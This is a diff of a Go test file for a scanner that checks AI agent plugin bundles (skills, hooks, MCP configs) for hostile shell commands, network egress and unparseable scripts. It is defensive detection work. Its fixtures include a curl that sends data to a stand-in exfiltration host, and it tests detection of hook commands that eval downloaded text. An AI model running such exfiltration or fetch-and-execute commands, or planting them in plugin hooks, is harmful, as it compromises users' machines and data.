@@ -3,7 +3,9 @@ package checks_test
 import (
 	"context"
 	"encoding/json"
+	"os"
 	"sort"
+	"strconv"
 	"strings"
 	"testing"
 	"testing/fstest"
@@ -15,10 +17,8 @@ import (
 	"agent-manager/internal/worker/scanner/rules"
 )
 
-// A rule addresses itself to a check by id, so the registry and the contract's
-// `check` enum have to be the same set in both directions: a rule addressing a
-// check that does not exist would load and never run, and a registered check
-// nothing can address would write a `pass` row nobody can make fail.
+// A rule addressing a missing check would never run, and a check no rule can
+// address would always pass, so the two sets must match exactly.
 func TestEveryCheckInTheContractIsRegisteredAndNoOthers(t *testing.T) {
 	raw, err := rules.RawSchema()
 	require.NoError(t, err)
@@ -46,10 +46,6 @@ func TestEveryCheckInTheContractIsRegisteredAndNoOthers(t *testing.T) {
 	require.Len(t, registered, len(contract), "a duplicate id would write one row and drop a result")
 }
 
-// TestEveryRegisteredCheckExplainsItself is what makes an unexplained check
-// impossible to ship: a reader on the Scanner screen has nothing else to learn
-// what a check's own warn or fail means, and the Scanner screen has no other
-// way to show it than what a check's own Explain returns.
 func TestEveryRegisteredCheckExplainsItself(t *testing.T) {
 	registry, err := checks.Default()
 	require.NoError(t, err)
@@ -60,8 +56,6 @@ func TestEveryRegisteredCheckExplainsItself(t *testing.T) {
 	}
 }
 
-// fakeCheck is a minimal Check this package does not otherwise construct, so
-// the registry's own validation can be exercised without touching a real one.
 type fakeCheck struct{ id, label, explain string }
 
 func (c fakeCheck) ID() string      { return c.id }
@@ -71,28 +65,20 @@ func (c fakeCheck) Run(context.Context, *checks.Bundle, []rules.Rule) (checks.Re
 	return checks.Result{}, nil, nil
 }
 
-// TestNewRegistryRefusesACheckWithNoExplanation proves the registry-level
-// guard actually fires, the way TestEveryRegisteredCheckExplainsItself proves
-// the shipped registry passes it.
 func TestNewRegistryRefusesACheckWithNoExplanation(t *testing.T) {
 	_, err := checks.NewRegistry(fakeCheck{id: "x", label: "X", explain: "   "})
 	require.Error(t, err, "a check with no explanation must not register")
 	require.Contains(t, err.Error(), "no explanation")
 }
 
-// The constitution requires both fixtures per rule, and the negative one is the
-// load-bearing half: a rule with only a positive fixture is how a rule that
-// matches everything ships.
+// The negative fixture is what stops a rule that matches everything from shipping.
 func TestEveryRuleTripsItsHostileFixtureAndSparesItsBenignOne(t *testing.T) {
 	pack, err := rules.Builtin()
 	require.NoError(t, err)
 	require.NoError(t, checks.Verify(context.Background(), pack))
 }
 
-// The other direction, across the whole pack rather than rule by rule: no benign
-// fixture may raise ANY finding. This is the zero-false-positive half of SC-005,
-// and it is what stops a new rule from being tuned into the catalog's every
-// package.
+// No benign fixture may raise a finding under any rule in the pack, not just its own.
 func TestNoBenignFixtureRaisesAnyFindingUnderTheWholePack(t *testing.T) {
 	pack, err := rules.Builtin()
 	require.NoError(t, err)
@@ -106,7 +92,7 @@ func TestNoBenignFixtureRaisesAnyFindingUnderTheWholePack(t *testing.T) {
 			require.Empty(t, findings, "a benign fixture raised %d finding(s)", len(findings))
 
 			require.Len(t, runs, len(registry.IDs()),
-				"every registered check writes a row, including the ones that pass (FR-025)")
+				"every registered check writes a row, including the ones that pass")
 			for _, run := range runs {
 				require.Equal(t, checks.OutcomePass, run.Result.Outcome, "check %s", run.CheckID)
 				require.Zero(t, run.Result.WarnCount)
@@ -115,10 +101,6 @@ func TestNoBenignFixtureRaisesAnyFindingUnderTheWholePack(t *testing.T) {
 	}
 }
 
-// FR-026 is why the shell audit parses instead of matching text, and this is the
-// difference it buys: a `curl` in a comment, in a string, or in a here-document is
-// not a command, and a scanner that could not tell would flag the documentation of
-// every package that documents a URL.
 func TestTheShellParserReadsCommandsRatherThanText(t *testing.T) {
 	script := strings.Join([]string{
 		"#!/usr/bin/env bash",
@@ -151,9 +133,8 @@ func TestTheShellParserReadsCommandsRatherThanText(t *testing.T) {
 		"only the executed curl is a command; the comment, the string and the here-document are not")
 }
 
-// An expansion is never resolved (FR-021) and is never dropped either: the target
-// arrives as its own text so the analysis can say it is indefinite, which grades
-// for review rather than passing as no target at all.
+// An expansion is never resolved or dropped: it stays as text so it grades as
+// indefinite rather than as no target.
 func TestAnUnresolvableTargetIsCarriedRatherThanDropped(t *testing.T) {
 	inspected := inspect(t, fstest.MapFS{
 		"SKILL.md":        file("---\nname: dynamic\ndescription: Reaches a host only a running shell would know.\n---\n"),
@@ -174,8 +155,7 @@ func TestAnUnresolvableTargetIsCarriedRatherThanDropped(t *testing.T) {
 		"a host behind an expansion cannot be shown to be in the expected set, so it is surfaced")
 }
 
-// A script the parser cannot read is the file a payload would most like to be in.
-// It is reported as a warning, never as a pass.
+// An unparseable script is where a payload would hide, so it warns rather than passes.
 func TestAnUnparseableScriptWarnsRatherThanPasses(t *testing.T) {
 	inspected := inspect(t, fstest.MapFS{
 		"SKILL.md":          file("---\nname: broken\ndescription: Ships a script that will not parse.\n---\n"),
@@ -196,8 +176,6 @@ func TestAnUnparseableScriptWarnsRatherThanPasses(t *testing.T) {
 	require.Equal(t, 1, audit.WarnCount)
 }
 
-// FR-027's second half, which is the one that is easy to get backwards: where no
-// expected set was recorded, a discovered host is surfaced rather than accepted.
 func TestAHostIsSurfacedWhenNoExpectationWasRecorded(t *testing.T) {
 	declared := inspect(t, fstest.MapFS{
 		"SKILL.md": file("---\nname: declared\ndescription: Declares the host it reaches.\n" +
@@ -222,12 +200,9 @@ func TestAHostIsSurfacedWhenNoExpectationWasRecorded(t *testing.T) {
 	_, silentFindings, err := registry.Run(context.Background(), silent, pack)
 	require.NoError(t, err)
 	require.NotEmpty(t, silentFindings,
-		"declaring nothing must not be the way to pass the network check (FR-027)")
+		"declaring nothing must not be the way to pass the network check")
 }
 
-// An allowlist that suffix-matches by default is an allowlist that allows
-// anything: `example.com` must not cover `evil.example.com`, while `*.example.com`
-// says the publisher meant subdomains.
 func TestAnAllowlistEntryDoesNotCoverASubdomainUnlessItSaysSo(t *testing.T) {
 	pack, err := rules.Builtin()
 	require.NoError(t, err)
@@ -257,9 +232,6 @@ func TestAnAllowlistEntryDoesNotCoverASubdomainUnlessItSaysSo(t *testing.T) {
 	}
 }
 
-// One finding per file, with the first location primary and the rest supporting.
-// data-model.md describes exactly this shape for SH-FS-007, and it is why
-// finding_evidence exists rather than a formatted string in one column.
 func TestOneFindingPerFileCarriesItsOtherLocationsAsSupportingEvidence(t *testing.T) {
 	pack, err := rules.Builtin()
 	require.NoError(t, err)
@@ -293,8 +265,7 @@ func TestOneFindingPerFileCarriesItsOtherLocationsAsSupportingEvidence(t *testin
 	}
 }
 
-// The quote is attacker-controlled: a bundle with one enormous line must not
-// choose the size of a database row or of a rendered page.
+// A bundle with one enormous line must not choose the size of a stored row.
 func TestAQuoteFromTheBundleIsBounded(t *testing.T) {
 	huge := "curl -sS https://collector.exfil.example/ingest --data '" + strings.Repeat("A", 4000) + "'"
 	inspected := inspect(t, fstest.MapFS{
@@ -317,8 +288,6 @@ func TestAQuoteFromTheBundleIsBounded(t *testing.T) {
 		require.LessOrEqual(t, len(finding.Detail), 8000)
 	}
 }
-
-// ---- helpers ----------------------------------------------------------------
 
 func inspect(t *testing.T, fsys fstest.MapFS) *checks.Bundle {
 	t.Helper()
@@ -353,3 +322,82 @@ func resultOf(t *testing.T, runs []checks.CheckRun, id string) checks.Result {
 }
 
 func file(body string) *fstest.MapFile { return &fstest.MapFile{Data: []byte(body)} }
+
+func TestTheShellRulesReadAHookCommand(t *testing.T) {
+	tree, err := checks.Tree(os.DirFS("testdata/hook-eval"))
+	require.NoError(t, err)
+	inspected, err := checks.Inspect(tree)
+	require.NoError(t, err)
+
+	pack, err := rules.Builtin()
+	require.NoError(t, err)
+	registry, err := checks.Default()
+	require.NoError(t, err)
+	_, findings, err := registry.Run(context.Background(), inspected, pack)
+	require.NoError(t, err)
+
+	const location = "com.anthropic.claude-code/hooks/hooks.json#/hooks/SessionStart/0/hooks/0/command"
+	byRule := map[string]checks.Finding{}
+	for _, finding := range findings {
+		byRule[finding.RuleID] = finding
+	}
+	require.Contains(t, byRule, "SH-SH-001", "eval of downloaded text in a hook is the curl|sh pattern")
+	require.Equal(t, location, byRule["SH-SH-001"].Primary().Path)
+	require.Zero(t, byRule["SH-SH-001"].Primary().Line, "a synthetic script has no line of its own")
+	require.Equal(t, location, byRule["SH-NET-002"].Primary().Path, "the curl inside the substitution is egress too")
+	require.Contains(t, byRule, "SH-HOOK-001")
+}
+
+func TestAnUnreadableHooksFileWarnsRatherThanPasses(t *testing.T) {
+	inspected := inspect(t, fstest.MapFS{
+		"plugin.json": file(`{"$schema":"https://agent-plugins.org/schemas/1.0.0/plugin.schema.json","name":"x"}`),
+		"com.anthropic.claude-code/hooks/hooks.json": file(`{"hooks":`),
+	})
+	require.Equal(t, []string{"com.anthropic.claude-code/hooks/hooks.json"}, inspected.Unparsed)
+}
+
+func TestAStdioServerIsReadAsItsCommandLine(t *testing.T) {
+	inspected := inspect(t, fstest.MapFS{
+		"plugin.json": file(`{"$schema":"https://agent-plugins.org/schemas/1.0.0/plugin.schema.json","name":"x"}`),
+		"mcp.json": file(`{"$schema":"https://agent-plugins.org/schemas/1.0.0/mcp.schema.json","mcpServers":` +
+			`{"db":{"type":"stdio","command":"docker","args":["run","-i","--rm","-e","TOKEN","ghcr.io/acme/db-mcp"]}}}`),
+	})
+	require.Len(t, inspected.Commands, 1)
+	command := inspected.Commands[0]
+	require.Equal(t, "mcp.json#/mcpServers/db", command.File)
+	require.Equal(t, "docker", command.Name)
+	require.Equal(t, []string{"run", "-i", "--rm", "-e", "TOKEN", "ghcr.io/acme/db-mcp"}, command.Args)
+}
+
+func TestPluginSurfaceFindingsNameWhereTheSurfaceIsDeclared(t *testing.T) {
+	pack, err := rules.Builtin()
+	require.NoError(t, err)
+	registry, err := checks.Default()
+	require.NoError(t, err)
+
+	for fixture, want := range map[string][]string{
+		"fixtures/SH-DEP-005/hostile": {
+			"SH-DEP-005 com.anthropic.claude-code/.mcp.json#/mcpServers/docs",
+			"SH-DEP-005 com.anthropic.claude-code/.mcp.json#/mcpServers/search",
+		},
+		"fixtures/SH-NET-005/hostile": {"SH-NET-005 com.anthropic.claude-code/.mcp.json#/mcpServers/tickets"},
+		"fixtures/SH-HOOK-001/hostile": {
+			"SH-HOOK-001 com.anthropic.claude-code/hooks/hooks.json#/hooks/PreToolUse/0/hooks/0",
+			"SH-HOOK-001 com.anthropic.claude-code/hooks/hooks.json#/hooks/SessionStart/0/hooks/0",
+		},
+		"fixtures/SH-SH-002/hostile": {"SH-SH-002 SKILL.md:6"},
+	} {
+		_, findings, err := scanFixture(t, registry, pack, fixture)
+		require.NoError(t, err)
+		got := make([]string, 0, len(findings))
+		for _, finding := range findings {
+			location := finding.Primary().Path
+			if finding.Primary().Line > 0 {
+				location += ":" + strconv.Itoa(finding.Primary().Line)
+			}
+			got = append(got, finding.RuleID+" "+location)
+		}
+		sort.Strings(got)
+		require.Equal(t, want, got, fixture)
+	}
+}
